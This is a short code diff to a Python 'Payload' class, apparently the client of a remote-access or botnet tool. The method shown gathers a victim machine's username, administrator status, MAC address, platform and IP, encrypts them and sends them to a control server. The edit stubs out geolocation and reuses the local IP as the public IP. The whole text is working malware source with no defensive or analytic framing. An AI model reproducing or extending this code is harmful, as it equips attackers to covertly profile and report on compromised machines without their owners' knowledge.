@@ -150,7 +150,7 @@ class Payload():
 
     def _get_info(self):
         info = {}
-        for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
+        for function in ['local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
             try:
                 info[function] = globals()[function]()
                 if isinstance(info[function], bytes):
@@ -162,10 +162,15 @@ class Payload():
         info['owner'] = "_b64__" + base64.b64encode(str(self.owner).encode('utf-8')).decode('ascii')
 
         # add geolocation of host machine
-        latitude, longitude = globals()['geolocation']()
+        # latitude, longitude = globals()['geolocation']()
+        latitude = '0'
+        longitude = '0'
         info['latitude'] = "_b64__" + base64.b64encode(latitude.encode('utf-8')).decode('ascii')
         info['longitude'] = "_b64__" + base64.b64encode(longitude.encode('utf-8')).decode('ascii')
 
+        #hardcode public_ip
+        info['public_ip'] = globals()['local_ip']()
+        
         # encrypt and send data to server
         data = globals()['encrypt_aes'](json.dumps(info), self.key)
         msg = struct.pack('!L', len(data)) + data
